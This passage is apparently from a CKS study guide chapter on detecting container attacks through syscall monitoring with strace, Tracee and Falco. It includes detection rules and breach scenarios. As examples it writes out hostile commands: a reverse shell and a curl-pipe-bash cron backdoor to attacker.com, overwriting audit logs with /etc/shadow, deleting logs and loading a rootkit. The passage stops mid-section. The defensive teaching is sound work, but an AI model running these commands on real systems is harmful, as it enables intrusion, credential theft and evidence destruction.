# Chapter 1: Perform Behavioral Analytics of Syscall Process

---

## Table of Contents

1. [Why Behavioral Analytics Matters](#1-why-behavioral-analytics-matters)
2. [The Security Paradox — No Absolute Guarantee](#2-the-security-paradox--no-absolute-guarantee)
3. [The Credit Card Analogy — Detection Over Prevention](#3-the-credit-card-analogy--detection-over-prevention)
4. [What Happens When a Container Is Compromised](#4-what-happens-when-a-container-is-compromised)
5. [What Are Syscalls and Why Monitor Them?](#5-what-are-syscalls-and-why-monitor-them)
   - [The Linux Syscall Interface](#the-linux-syscall-interface)
   - [Why Syscalls Reveal Everything](#why-syscalls-reveal-everything)
   - [The Scale Problem](#the-scale-problem)
6. [Suspicious Syscall Patterns — What to Look For](#6-suspicious-syscall-patterns--what-to-look-for)
7. [Tools for Syscall Monitoring](#7-tools-for-syscall-monitoring)
   - [strace — Low-Level Syscall Tracing](#strace--low-level-syscall-tracing)
   - [AquaSec Tracee — eBPF-Based Tracing](#aquasec-tracee--ebpf-based-tracing)
   - [Falco — Runtime Security and Alerting](#falco--runtime-security-and-alerting)
8. [As a DevSecOps / Kubernetes Security Engineer](#8-as-a-devsecops--kubernetes-security-engineer)
9. [Real Present-Day Scenarios](#9-real-present-day-scenarios)
10. [What Happens If You Don't Follow This](#10-what-happens-if-you-dont-follow-this)
11. [Most Common Commands and Syntax](#11-most-common-commands-and-syntax)
12. [Other Tools and Services Available](#12-other-tools-and-services-available)
13. [How AI Is Impacting Behavioral Analytics](#13-how-ai-is-impacting-behavioral-analytics)
14. [CKS Exam Tips](#14-cks-exam-tips)
15. [Extra Information and References](#15-extra-information-and-references)

---

## 1. Why Behavioral Analytics Matters

Every chapter in this CKS study guide up to this point has been about building walls — preventing unauthorised access through hardening, sandboxing, network policies, RBAC, image scanning, and supply chain controls. These controls are essential. But they share a fundamental limitation: they assume you can enumerate and block every possible attack in advance.

Behavioral analytics flips this assumption. Instead of asking "what should we block?", it asks "what is actually happening right now, and does it match what should be happening?" This shift — from prevention-only to detection-plus-response — is what separates a mature security posture from a fragile one.

Syscall-level behavioral analytics matters specifically because:

- **Syscalls are the ground truth of what a process is doing.** Every file read, network connection, process spawn, memory allocation, and privilege change produces a syscall. There is no way for a process to hide from syscall monitoring without exploiting a kernel vulnerability.
- **Attackers cannot evade syscall monitoring without changing their behaviour.** An attacker who gains shell access to a container must use syscalls to do anything useful. Reading `/etc/shadow`, writing to a log file, spawning a reverse shell, mounting a host path — all of these produce observable syscall sequences.
- **Containers in Kubernetes share the host kernel.** All pods on a node share the same Linux kernel. Syscall monitoring at the kernel level gives you visibility into every container on every node simultaneously — no per-container agent required.
- **Detection enables response.** Even when prevention fails (and it will fail eventually), early detection limits the blast radius. A breach detected in minutes causes orders of magnitude less damage than one detected in weeks.

---

## 2. The Security Paradox — No Absolute Guarantee

Modern Kubernetes security practice involves multiple overlapping layers of controls:

![The image lists security measures: Securing Cluster, Sandboxing Techniques, Restricting Network Access, Minimizing Microservices Vulnerability, and MTLS Encryption.](https://kodekloud.com/kk-media/image/upload/v1752871685/notes-assets/images/Certified-Kubernetes-Security-Specialist-CKS-Perform-behavioral-analytics-of-syscall-process/frame_30.jpg)

These layers include:

- **Securing the cluster** — Hardening the API server, etcd encryption, RBAC, kubeconfig controls, audit logging
- **Sandboxing techniques** — gVisor, Kata Containers, seccomp profiles, AppArmor, Linux capabilities restriction
- **Restricting network access** — NetworkPolicies, node firewall rules, API server access control, egress filtering
- **Minimising microservice vulnerabilities** — mTLS between services, Pod Security Standards, security contexts, secret management
- **mTLS encryption** — Mutual TLS for service-to-service communication, certificate rotation, Cilium encryption

And yet — even with every one of these controls implemented correctly — there is no absolute guarantee against emerging threats. The reasons are structural:

**Zero-day vulnerabilities** exist in the Linux kernel, container runtimes (containerd, CRI-O), Kubernetes components, and every application library. By definition, they are unknown until exploited. No preventive control blocks an exploit that has never been seen before.

**Misconfiguration gaps** are inevitable in complex systems. A single overly permissive RBAC role, an unpatched node, a service account with excessive permissions, a namespace missing a NetworkPolicy — any of these creates an opening.

**Social engineering and insider threats** bypass technical controls entirely. A developer whose credentials are phished, a supply chain compromise that inserts a backdoor before the code reaches your pipeline — the attack enters through a trusted path.

**Novel attack techniques** evolve constantly. Container escape techniques, kernel exploitation methods, and lateral movement strategies that weren't possible last year may be trivial this year.

The conclusion is not that preventive controls are useless — they are absolutely necessary. The conclusion is that they are **necessary but not sufficient**. You must also assume that breaches will occur and invest in detection.

![The image depicts a network diagram with three "controlplane" nodes and two "worker" nodes, connected in sequence, with an arrow pointing to a worker node from a figure.](https://kodekloud.com/kk-media/image/upload/v1752871688/notes-assets/images/Certified-Kubernetes-Security-Specialist-CKS-Perform-behavioral-analytics-of-syscall-process/frame_60.jpg)

The attacker in this diagram has gained a foothold on one worker node. The question is not whether this can happen — it is how quickly you detect it and how much damage they can do before you respond.

---

## 3. The Credit Card Analogy — Detection Over Prevention

To understand why detection matters as much as prevention, consider how credit card security has evolved:

![The image shows a credit card icon with three features: Instant Notifications, Revert Transactions, and Transaction Limits.](https://kodekloud.com/kk-media/image/upload/v1752871689/notes-assets/images/Certified-Kubernetes-Security-Specialist-CKS-Perform-behavioral-analytics-of-syscall-process/frame_150.jpg)

Modern credit cards have exceptional preventive security — EMV smart chips, contactless authentication, cryptographic transaction signing, 3D Secure for online payments. And yet cards are still stolen, PINs are still shoulder-surfed, and payment credentials are still compromised.

**The pre-smartphone era:** If your card was compromised, you wouldn't know until you reviewed your monthly statement — potentially weeks later. By then, the attacker had made dozens of transactions, withdrawn cash from multiple ATMs, and moved on. The damage was done and largely irreversible.

**The smartphone era:** The moment a transaction occurs, your phone buzzes. You see the amount, merchant, and location in real time. If it is not a transaction you made, you tap "Report as fraud" within seconds. The bank reverses the transaction, cancels the card, issues a new one. The attacker made one transaction before being shut down.

Additionally, transaction limits create a ceiling on potential damage — even if the attacker has full card access, they cannot drain more than the configured limit before triggering additional friction.

**The direct parallel to Kubernetes:**

| Credit Card | Kubernetes Cluster |
|-------------|-------------------|
| Card stolen / PIN compromised | Container compromised / credentials leaked |
| Monthly statement review | Periodic security audit |
| Instant smartphone notification | Falco real-time alert |
| Reverse transaction | Kill pod, replace node, revoke credentials |
| Transaction limits | RBAC limits, network policies, resource quotas |

The insight: **adding runtime behavioural detection to your Kubernetes cluster is the equivalent of turning on instant transaction notifications.** You move from discovering breaches weeks later (during audits) to detecting them in seconds (via Falco alerts), enabling rapid containment before the blast radius expands.

> **Early detection of suspicious activity can significantly mitigate the impact of a breach.** By rapidly identifying irregularities, you can quickly contain any threat and prevent further damage.

---

## 4. What Happens When a Container Is Compromised

Understanding the typical post-compromise behaviour of an attacker helps you understand what syscall patterns to look for:

![The image depicts a network diagram with control plane and worker nodes, highlighting a security breach on a worker node with a warning symbol and an intruder icon.](https://kodekloud.com/kk-media/image/upload/v1752871690/notes-assets/images/Certified-Kubernetes-Security-Specialist-CKS-Perform-behavioral-analytics-of-syscall-process/frame_170.jpg)

**Typical attacker kill chain after gaining container access:**

```
Step 1: Initial Access
  → Exploit web app vulnerability → Remote code execution
  → Compromised image with backdoor → C2 callback on startup
  → Supply chain compromise → malicious container starts

Step 2: Reconnaissance
  → cat /etc/passwd, /etc/shadow, /etc/hosts
  → env (environment variables — looking for secrets, credentials)
  → mount, df -h (what filesystems are accessible?)
  → ps aux, ss -tlnp (what processes and network connections exist?)
  → ls /var/run/secrets/kubernetes.io/serviceaccount/ (is there a K8s SA token?)

Step 3: Privilege Escalation
  → Check for SUID binaries: find / -perm -u=s -type f
  → Exploit kernel vulnerabilities if CAP_SYS_ADMIN available
  → Attempt to mount host filesystem if hostPath volumes present
  → Use the K8s service account token to interact with the API server

Step 4: Lateral Movement
  → Port scan internal cluster network (Kubernetes pod CIDR)
  → Access other pods' service endpoints
  → Attempt to access the Kubernetes API server
  → Read secrets from mounted volumes or etcd (if API access obtained)

Step 5: Persistence
  → Install a backdoor binary on a writable filesystem
  → Create a new privileged pod via the compromised SA token
  → Add SSH keys to authorised_keys on a mounted host path

Step 6: Cover Tracks
  → cat /etc/shadow > /opt/logs/audit.log  (overwrite audit logs)
  → history -c (clear shell history)
  → rm -f /var/log/* (delete logs)
  → unset HISTFILE (disable history for current session)
```

Every single one of these actions produces observable syscalls. Behavioral analytics tools like Falco have rules that fire on these patterns:

```
Step 2 → Rule: "Read sensitive file untrusted" (access to /etc/shadow)
Step 2 → Rule: "Container Drift Detected" (unexpected binary execution)
Step 3 → Rule: "Detect attempts to run interactive commands in a container"
Step 3 → Rule: "Create Privileged Pod" (if SA token used)
Step 4 → Rule: "Contact K8s API Server From Container"
Step 5 → Rule: "Modify Binary Dirs" (write to /usr/bin, /usr/sbin)
Step 6 → Rule: "Clear Log Activities" (modification of audit logs, syslog)
Step 6 → Rule: "Remove Bulk Data from Disk" (rm -rf on log directories)
```

The KodeKloud example illustrates step 6 precisely:

```bash
# Attacker with shell access tries to cover their tracks
kubectl exec -ti nginx-master -- bash
# cat /etc/shadow > /opt/logs/audit.log
```

This command reads `/etc/shadow` (sensitive password hashes) and overwrites the audit log with its contents — simultaneously exfiltrating credentials and destroying evidence. Deleting or overwriting parts of audit logs is not typical for a legitimate administrator, making it an unambiguous anomaly flag.

---

## 5. What Are Syscalls and Why Monitor Them?

### The Linux Syscall Interface

A **system call (syscall)** is the mechanism by which a process in user space requests a service from the Linux kernel. Every interaction a process has with the operating system — reading a file, writing to a socket, creating a new process, allocating memory, changing permissions — happens through the syscall interface.

```
User Space (containers, applications)
    ↕  syscall interface (int 0x80 / syscall instruction)
Kernel Space (Linux kernel)
    ↕  hardware abstraction
Hardware (CPU, memory, disk, network)
```

Common syscalls and what they reveal:

| Syscall | What It Does | Suspicious When... |
|---------|-------------|-------------------|
| `open` / `openat` | Open a file | Opening `/etc/shadow`, `/etc/passwd`, `/proc/*/mem` |
| `read` | Read from file descriptor | Reading sensitive files |
| `write` | Write to file descriptor | Writing to unexpected locations |
| `execve` | Execute a program | Unexpected binary execution inside a container |
| `fork` / `clone` | Create a new process | Spawning shells, unexpected child processes |
| `connect` | Establish a network connection | Unexpected outbound connections, C2 callbacks |
| `bind` | Bind a socket to an address | Unexpected listening services |
| `ptrace` | Trace/debug another process | Process injection, debugging other containers |
| `mmap` | Map memory | Shellcode injection patterns |
| `mount` | Mount a filesystem | Mounting host paths, escape attempts |
| `chdir` | Change directory | Navigation to sensitive directories |
| `unlink` / `rename` | Delete/rename files | Deleting log files, replacing binaries |
| `kill` | Send signal to process | Killing monitoring agents |
| `socket` | Create a network socket | Unexpected networking |
| `setuid` / `setgid` | Change user/group ID | Privilege escalation attempts |

### Why Syscalls Reveal Everything

The critical property of syscall monitoring is that it is **impossible to hide from the kernel's perspective**. A process can:
- Use encryption to hide network traffic contents (but the `connect` syscall is still visible)
- Use obfuscation to disguise code (but `execve` is still called when it runs)
- Delete log files (but `unlink` is still the syscall that deletes them, and it is observable)
- Try to kill the monitoring agent (but `kill` is itself a syscall)

This is why syscall monitoring is qualitatively different from log-based monitoring. Logs can be deleted, tampered with, or simply not generated. Syscalls happen at the kernel level — below the application, below the container runtime, below any application-level logging.

### The Scale Problem

![The image illustrates Falco monitoring system calls from containers interacting with the Linux kernel and hardware, listing specific syscalls like close and nanosleep.](https://kodekloud.com/kk-media/image/upload/v1752871692/notes-assets/images/Certified-Kubernetes-Security-Specialist-CKS-Perform-behavioral-analytics-of-syscall-process/frame_210.jpg)

The challenge: a production Kubernetes cluster with hundreds of pods generates **millions of syscalls per second**. A single nginx container handling moderate traffic generates thousands of syscalls per second — `accept`, `read`, `write`, `close` for every HTTP request.

Raw syscall capture at this volume is:
- **Impossible to review manually** — no human can read millions of events per second
- **Expensive to store** — raw syscall streams are enormous
- **Noisy** — the vast majority of syscalls are completely benign

This is where **behavioral analytics** enters. Instead of capturing and storing all syscalls, tools like Falco use **rules** — patterns that describe suspicious syscall sequences — and only alert on matches. The rule engine processes all syscalls in real time but only surfaces the ones that match threat patterns.

```
10,000,000 syscalls/second
    ↓  Falco rule engine (in-kernel with eBPF or kernel module)
5 alerts/day → human-reviewable
```

---

## 6. Suspicious Syscall Patterns — What to Look For

The following patterns form the basis of Falco's default ruleset and represent the most common attack behaviours at the syscall level:

**Shell execution inside a container:**
```bash
# Someone ran bash/sh inside a running container
kubectl exec -ti nginx-master -- bash
# Produces: execve("/bin/bash", ...) inside the container namespace
```
Legitimate applications don't typically spawn interactive shells. If an nginx container spawns `/bin/bash`, it is almost certainly an attacker or a developer who should be using a different debugging approach.

**Sensitive file access:**
```bash
# Reading password hashes
cat /etc/shadow       # openat(AT_FDCWD, "/etc/shadow", O_RDONLY)
# Reading SSH private keys
cat /root/.ssh/id_rsa
# Reading Kubernetes service account tokens
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

**Log tampering — the KodeKloud example:**
```bash
# Overwriting audit logs with shadow file contents
cat /etc/shadow > /opt/logs/audit.log
# Produces: openat("/etc/shadow"), read(), openat("/opt/logs/audit.log", O_WRONLY|O_TRUNC), write()
# BOTH suspicious (reading shadow) AND anomalous (truncating audit log)
```

**Binary modification:**
```bash
# Replacing system binaries with trojaned versions
cp /tmp/evil-binary /usr/bin/ls
# Produces: openat("/usr/bin/ls", O_WRONLY|O_CREAT|O_TRUNC) — writing to binary directory
```

**Unexpected network connections:**
```bash
# Reverse shell callback to attacker C2 server
bash -i >& /dev/tcp/attacker.com/4444 0>&1
# Produces: socket(), connect() to external IP on unusual port
```

**Namespace escape attempts:**
```bash
# Attempting to access host filesystem via /proc
ls /proc/1/root/   # Access to init process (PID 1 = host) root filesystem
# Produces: openat("/proc/1/root", ...) — accessing host PID namespace
```

**Kernel module loading:**
```bash
# Loading a rootkit
insmod /tmp/rootkit.ko
# Produces: init_module() or finit_module() syscall — almost always suspicious in containers
```

---

## 7. Tools for Syscall Monitoring

### strace — Low-Level Syscall Tracing

`strace` is the classic Linux tool for tracing syscalls made by a process. It is invaluable for debugging and understanding what a specific process is doing, but it is not suitable for production monitoring:

```bash
# Trace all syscalls made by a specific process
strace -p <pid>

# Trace a specific syscall type
strace -e trace=openat,read,write -p <pid>

# Trace a new process from launch
strace ls -la /etc

# Trace with timestamps
strace -t -p <pid>

# Trace with output to file
strace -o /tmp/strace.log -p <pid>

# Count syscall frequency
strace -c ls /etc
# Output:
# % time     seconds  usecs/call     calls    errors syscall
# -------  --------- ----------- --------- --------- ----------------
#  28.57   0.000002          0         8           openat
#  14.29   0.000001          0         8           read
#  ...

# Attach strace to a running container's process
CONTAINER_PID=$(docker inspect --format '{{.State.Pid}}' nginx-container)
strace -p $CONTAINER_PID
```

**Limitations of strace for production use:**
- **Significant performance overhead** — strace intercepts every syscall via ptrace, causing 2-10x slowdown
- **One process at a time** — cannot monitor all containers simultaneously
- **No alerting** — produces raw output that must be manually reviewed
- **No rules engine** — no way to define "alert me when this pattern occurs"
- **Requires ptrace capability** — the monitoring process needs elevated privileges

### AquaSec Tracee — eBPF-Based Tracing

Tracee (from Aqua Security) is a more modern approach using **eBPF** (extended Berkeley Packet Filter) to trace syscalls at near-zero performance cost. It is suitable for environments where you want deep forensic tracing without the overhead of strace:

```bash
# Install and run Tracee via Docker
docker run --name tracee --rm --privileged \
  --pid=host -v /lib/modules/:/lib/modules/:ro \
  -v /usr/src:/usr/src:ro \
  -v /tmp/tracee:/tmp/tracee \
  aquasec/tracee:latest

# Trace specific events
docker run --name tracee --rm --privileged \
  --pid=host -v /lib/modules/:/lib/modules/:ro \
  aquasec/tracee:latest \
  --trace event=execve,openat,connect

# Trace a specific container
docker run --name tracee --rm --privileged \
  --pid=host -v /lib/modules/:/lib/modules/:ro \
  aquasec/tracee:latest \
  --trace container=<container-id>

# Detect specific signatures (predefined attack patterns)
docker run --name tracee --rm --privileged \
  --pid=host -v /lib/modules/:/lib/modules/:ro \
  aquasec/tracee:latest \
  --detect

# Example Tracee output:
# TIME             UID    COMM             PID     TID     RET              EVENT                ARGS
# 11:23:45:123456  0      bash             1234    1234    0                execve               pathname: /bin/cat, argv: [cat, /etc/shadow]
# 11:23:45:123789  0      cat              1235    1235    3                openat               dirfd: AT_FDCWD, pathname: /etc/shadow, flags: O_RDONLY
```

Tracee uses eBPF to hook into the kernel's syscall interface with minimal overhead — typically less than 1% CPU impact. However, it requires a relatively modern kernel (4.18+) with eBPF support.

### Falco — Runtime Security and Alerting

Falco is the **production-grade, Kubernetes-native solution** for behavioral analytics. It is the tool covered in subsequent chapters and the one most relevant to the CKS exam. Unlike strace (single-process, high overhead) or Tracee (forensics-focused), Falco is designed for:

- **Continuous production monitoring** of all processes on all nodes
- **Rule-based alerting** — define what is suspicious, get notified when it occurs
- **Multiple output channels** — stdout, syslog, files, Slack, PagerDuty, Falcosidekick
- **Low overhead** — kernel module or eBPF probe adds <5% CPU overhead
- **Kubernetes integration** — rules can reference K8s metadata (namespace, pod name, image)

```
Syscalls from all containers
    ↓  kernel module or eBPF probe
Falco rule engine
    ↓  match against rules (e.g., "Read sensitive file")
Alert: "File below /etc opened for reading by cat in container nginx-master"
    ↓  output channels
  → stdout (for testing)
  → syslog (for SIEM ingestion)
  → webhook (for Slack/PagerDuty/Falcosidekick)
  → gRPC (for programmatic response)
```

Falco will be covered in depth in Chapters 2, 3, and 4. This chapter establishes the conceptual foundation for why it is needed.

---

## 8. As a DevSecOps / Kubernetes Security Engineer

Behavioral analytics is not a tool you configure once and forget. It is an ongoing operational discipline. As a DevSecOps engineer, your responsibilities around syscall monitoring span architecture, operations, and incident response.

**Architecting the monitoring layer:** You decide which monitoring approach fits your environment. Falco with the eBPF probe is the modern, preferred approach — no kernel module compilation needed, works on managed Kubernetes (GKE, EKS, AKS). The kernel module approach is for environments where eBPF is not available (older kernels, restricted environments).

**Tuning rules to reduce noise:** Default Falco rules generate alerts for every `kubectl exec` into a pod. In a development environment with hundreds of developers, this creates noise that desensitises the team. You tune rules to be environment-aware:

```yaml
# Suppress kubectl exec alerts for the 'dev' namespace
- rule: Terminal shell in container
  condition: >
    spawned_process and container
    and shell_procs
    and not container.image.repository = "dev-tools"
    and not k8s.ns.name = "dev"   # Allow exec in dev namespace
  output: "Shell spawned in container (user=%user.name ns=%k8s.ns.name pod=%k8s.pod.name)"
  priority: WARNING
```

**Building the incident response workflow:** When Falco fires an alert, you need a defined response. Your runbook for "Shell spawned in production container" might be:

1. Verify the alert in Falco logs — is it a real alert or a false positive?
2. Identify the pod, node, and namespace from the alert metadata
3. Capture a snapshot of the pod's current state: `kubectl describe pod`, running processes, network connections
4. Cordon the node to prevent new pod scheduling: `kubectl cordon <node>`
5. If confirmed compromise: `kubectl delete pod <pod>` — trigger replacement from deployment
6. Collect forensic evidence before deleting: `kubectl exec` to capture process list, network connections, modified files
7. Drain and replace the node if the host-level compromise is suspected: `kubectl drain <node>`
8. Update JIRA/incident tracking with timeline and evidence
9. Post-mortem to identify the attack vector and patch it

**Monitoring the monitoring system:** Sophisticated attackers will attempt to kill or disable Falco. You need:
- Falco running as a DaemonSet with `priorityClass: system-node-critical` (cannot be evicted)
- A Falco rule that alerts if Falco itself is killed: `kill` syscall targeting the Falco process
- An external monitoring system (Prometheus) that alerts if Falco pods disappear from nodes
- Falco alerts stored in an external SIEM (Splunk, Elasticsearch) that the attacker cannot reach from within the cluster

**Correlating with other signals:** Syscall alerts alone tell part of the story. A mature detection posture correlates:
- Falco alerts (what processes are doing)
- Kubernetes audit logs (what the API server is seeing)
- Network flow logs (where traffic is going)
- Container logs (application-level behaviour)

When a Falco alert fires, you cross-reference it with the Kubernetes audit log to see if any API server calls were made around the same time. A combination of "Shell spawned in container" + "ServiceAccount token used to list secrets" is a strong signal of active compromise.

---

## 9. Real Present-Day Scenarios

### Scenario 1: The Cryptominer Discovery

A streaming company's production cluster began experiencing CPU throttling across multiple pods. Developers noticed their applications were running slowly but assumed it was a traffic spike. Three days later, a Falco alert (configured by a new DevSecOps hire) fired:

```
Rule: "Launch Ingress Remote File Copy Tools in Container"
Output: container=payment-service image=myregistry.io/payment:1.0 
        command=curl http://xmr-pool.example.com/miner.sh
```

Investigation revealed: a vulnerability in the payment service had been exploited two weeks earlier. The attacker downloaded and ran an XMRig cryptocurrency miner inside the container. Without Falco, this would have continued indefinitely — the container image was legitimate and the only evidence was inside the container's process list.

The response: delete the pod, trigger a fresh deployment, patch the vulnerability, and retroactively enable Falco on all namespaces (it had only been running on the monitoring namespace). Total damage: three weeks of stolen compute. With Falco enabled from the start, it would have been detected on day one.

### Scenario 2: kubectl exec Used as an Attack Vector

A fintech company's post-incident analysis revealed that an attacker who had compromised a developer's laptop credentials used `kubectl exec` to access a database migration container, then read environment variables containing production database credentials:

```bash
kubectl exec -ti db-migration-abc123 -- bash
env | grep -i password    # Found DB_PASSWORD=prod_secret_here
env | grep -i key         # Found AWS_SECRET_ACCESS_KEY=...
```

Falco would have fired immediately on:
- `Terminal shell in container` — spawning bash in the migration container
- `Read sensitive file untrusted` — if they accessed any mounted secrets
- `Contact K8s API Server From Container` — if they used the credentials to make API calls

The company's response: add Falco `Terminal shell in container` alerts to their SOC SIEM with immediate escalation, and implement `kubectl exec` restrictions via RBAC (separate role required for exec permission).

### Scenario 3: The Log Tampering Attack

Exactly mirroring the KodeKloud example, a red team exercise demonstrated:

```bash
kubectl exec -ti nginx-master -- bash
cat /etc/shadow > /opt/logs/audit.log
history -c
exit
```

A properly configured Falco instance would have generated three separate alerts:
1. **"Terminal shell in container"** — bash spawned in nginx container
2. **"Read sensitive file untrusted"** — `/etc/shadow` opened for reading by non-root process in container context
3. **"Clear Log Activities"** — audit log truncated and overwritten

Each alert alone might be investigated; all three together in sequence is a high-confidence signal of active attacker activity.

### Scenario 4: Container Escape Attempt

An attacker exploited a CVE in a container runtime to attempt a container escape on a Kubernetes worker node. Their technique involved accessing `/proc/1/root` — the host filesystem as seen through the init process's namespace — to write a cron job that would establish persistence on the host:

```bash
# Inside compromised container
ls /proc/1/root/etc/cron.d/
echo "* * * * * root curl http://attacker.com/payload | bash" > /proc/1/root/etc/cron.d/backdoor
```

Falco rules for container escape attempts:
```yaml
- rule: Container Escape via /proc/1/root
  condition: >
    open_write and container and
    fd.name startswith /proc/1/root
  output: "Possible container escape attempt (proc=%proc.name fd=%fd.name container=%container.name)"
  priority: CRITICAL
```

The alert fired within milliseconds of the file write. The automated response (Falcosidekick → webhook → PagerDuty → on-call engineer) had the node cordoned within 4 minutes of the escape attempt.

### Scenario 5: The Slow-and-Low Attacker

Most real attackers don't trigger obvious alerts. They operate slowly, using normal-looking syscalls. A sophisticated attacker who gained access to a customer-facing API pod:

- Waited 24 hours before taking any action (to avoid immediate detection correlation)
- Read environment variables slowly, one at a time, over several hours
- Exfiltrated data via the pod's legitimate outbound network connectivity (no unusual `connect` calls)
- Never spawned a shell (used the compromised process itself as their interface)

This attacker evaded simple syscall rules. Catching them required:
- **Baseline deviation detection** — the pod's normal syscall frequency for `read` was 1,000/min; the attacker's activity was 50,000/min (reading large volumes of customer data)
- **Network flow anomaly** — outbound traffic volume was 10x the normal baseline
- **Process behaviour profiling** — the API process normally only reads its config files; suddenly it was reading environment variables and `/proc` entries

This is the frontier of behavioral analytics — moving from rule-based (known bad patterns) to anomaly-based (deviation from learned normal behaviour).

---

## 10. What Happens If You Don't Follow This

**Without any runtime behavioral monitoring:**
- Breaches go undetected for weeks or months. The IBM Cost of a Data Breach Report consistently finds that the average breach takes 207 days to identify and 70 days to contain — 277 days of undetected attacker access.
- In a Kubernetes cluster without runtime monitoring, an attacker who gains pod access can move laterally to the Kubernetes API, access secrets, exfiltrate data, deploy persistent backdoors, and establish long-term access — all while appearing as normal pod activity.
- You cannot prove that a breach did NOT occur. Compliance auditors ask for evidence of monitoring. "We don't have runtime monitoring" fails SOC 2, PCI-DSS, and most enterprise security questionnaires.

**Without syscall-level visibility:**
- Application-level logs can be disabled, redirected, or deleted by an attacker with file system access. Syscalls cannot.
- Sophisticated attackers specifically target log infrastructure. Without syscall monitoring, they can operate in a logging blackout.

**Without detection, response is impossible:**
- You cannot contain what you cannot see. An undetected breach grows — more data exfiltrated, more lateral movement, more persistence mechanisms installed.
- Incident response requires knowing when the breach started, what was accessed, and what was changed. Without syscall monitoring, this forensic reconstruction is guesswork.

**The compliance dimension:**
- NIST SP 800-53 (IR-4, SI-4), PCI-DSS Requirement 10, HIPAA §164.312(b), and FedRAMP all require intrusion detection and monitoring capabilities. Runtime behavioral monitoring is a direct control implementation.

---

## 11. Most Common Commands and Syntax

### strace

```bash
# Trace all syscalls of a process
strace -p <pid>

# Trace specific syscalls only
strace -e trace=openat,read,write,execve,connect -p <pid>

# Trace from the start of a new process
strace ls /etc

# Count syscall frequency (performance profiling)
strace -c -p <pid>

# Trace with timestamps (microseconds)
strace -T -p <pid>

# Follow child processes too
strace -f -p <pid>

# Find the PID of a container's main process
CONTAINER_PID=$(docker inspect --format '{{.State.Pid}}' <container-name>)
strace -p $CONTAINER_PID

# Or for a Kubernetes pod's container
kubectl get pod <pod> -o jsonpath='{.status.containerStatuses[0].containerID}'
# Then: crictl inspect <container-id> | jq .info.pid
```

### Checking Syscall Activity in a Running Container

```bash
# List all syscalls a container's process is making (requires strace/bpftrace)
# Get container PID
CPID=$(crictl inspect $(crictl ps | grep nginx | awk '{print $1}') | jq .info.pid)

# Brief strace snapshot
timeout 5 strace -p $CPID -e trace=openat,execve,connect 2>&1

# Using bpftrace for lower overhead
bpftrace -e 'tracepoint:syscalls:sys_enter_execve { printf("execve: %s\n", str(args->filename)); }'

# Using perf to count syscalls
perf stat -e 'syscalls:sys_enter_*' -p $CPID sleep 10
```

### kubectl exec (the monitored activity)

```bash
# The action that triggers "Terminal shell in container" alerts in Falco
kubectl exec -ti <pod-name> -- bash
kubectl exec -ti <pod-name> -- sh

# Running a specific command without spawning an interactive shell (less detectable)
kubectl exec <pod-name> -- cat /etc/shadow

# Viewing environment variables (common attacker reconnaissance)
kubectl exec <pod-name> -- env

# Listing running processes
kubectl exec <pod-name> -- ps aux
```

### Tracee

```bash
# Run Tracee with Docker
docker run --name tracee --rm --privileged --pid=host \
  -v /lib/modules/:/lib/modules/:ro \
  -v /usr/src:/usr/src:ro \
  aquasec/tracee:latest

# Trace specific events
docker run --rm --privileged --pid=host \
  -v /lib/modules/:/lib/modules/:ro \
  aquasec/tracee:latest \
  --trace event=execve,openat

# Detect suspicious behaviour signatures
docker run --rm --privileged --pid=host \
  -v /lib/modules/:/lib/modules/:ro \
  aquasec/tracee:latest \
  --detect
```

---

## 12. Other Tools and Services Available

### Syscall Monitoring and Tracing

| Tool | Type | Strengths | Best For |
|------|------|-----------|----------|
| **Falco** (Sysdig/CNCF) | Production runtime security | Rule-based alerting; K8s native; eBPF or module; multi-output | Production monitoring — the standard |
| **Tracee** (Aqua Security) | eBPF forensics | Deep tracing; signature detection; open-source | Forensic investigation; complementary to Falco |
| **strace** | Process-level tracer | Fine-grained detail; built into Linux | Debugging specific processes; forensics |
| **sysdig** | System exploration tool | Powerful filters; can read pcap-like files; K8s aware | Investigation and forensics |
| **bpftrace** | eBPF scripting | Custom eBPF programs; very low overhead | Custom tracing and metrics |
| **perf** | Linux performance tool | Syscall counting; hardware events | Performance analysis with syscall context |
| **auditd** | Linux audit daemon | Persistent audit log; file access tracking | Compliance logging; file integrity |
| **Tetragon** (Cilium) | eBPF security | In-kernel enforcement (not just alerting); network-aware | Kubernetes-native eBPF enforcement |

### Cloud-Native Runtime Security Platforms

| Platform | Key Feature |
|----------|------------|
| **Prisma Cloud** (Palo Alto) | Combined CSPM + runtime; process whitelisting |
| **Wiz** | Cloud-native; agentless sensor; graph-based detection |
| **Lacework** | ML-based anomaly detection; process behaviour baseline |
| **Aqua Security Platform** | Tracee integration; micro-segmentation; drift prevention |
| **Sysdig Secure** | Enterprise Falco; compliance dashboards; forensics |
| **StackRox** (Red Hat) | Kubernetes-native; process allowlisting; network baselining |
| **NeuVector** (SUSE) | Zero-trust; process and network behavioural learning |

### SIEM Integration (Where Falco Alerts Go)

| Platform | Integration Method |
|----------|------------------|
| **Splunk** | Falcosidekick → HTTP event collector |
| **Elasticsearch/Kibana** | Falcosidekick → Elasticsearch output |
| **Google Chronicle** | Falcosidekick → Chronicle API |
| **Microsoft Sentinel** | Falcosidekick → Azure Event Hub |
| **Datadog** | Falcosidekick → Datadog API |
| **PagerDuty** | Falcosidekick → PagerDuty events |

---

## 13. How AI Is Impacting Behavioral Analytics

### ML-Based Anomaly Detection — Beyond Rules

Rule-based systems like Falco excel at detecting known bad patterns. But sophisticated attackers specifically craft techniques that don't match known rules. AI-powered anomaly detection addresses this:

- **Process behaviour baselining** — ML models learn the normal process tree, syscall frequency distributions, and file access patterns for each unique container image. Any deviation beyond a statistical threshold triggers an alert — even for never-before-seen attack techniques.
- **Lacework's Polygraph** uses unsupervised ML to build a process and network communication graph for each workload. Anomalies — new processes, new network connections, new file accesses — are scored by deviation from the learned baseline.
- **StackRox / Red Hat ACS** baselines normal process execution for each deployment and alerts on process drift — containers running processes not seen during the learning period.

### AI-Powered Alert Correlation and Triage

Individual Falco alerts are easy to act on. But in a large cluster, thousands of Falco alerts per day are generated by legitimate activity (CI/CD jobs, debugging sessions, autoscaling events). AI is being used to:

- **Correlate alerts into attack chains** — instead of "alert on shell in container", correlate "shell spawned" + "sensitive file read" + "unusual outbound connection" into a single "active intrusion" incident with high confidence.
- **Suppress false positives** — ML models learn which alerts are consistently followed by human investigation with "not a threat" conclusions and automatically suppress similar future alerts.
- **Score incidents by risk** — not all "shell in container" alerts are equal. An alert in a `kube-system` pod with a privileged service account is far more severe than one in a dev-namespace scratch pod.

### AI in Kernel-Level Detection

Emerging research is applying deep learning directly to raw syscall streams:

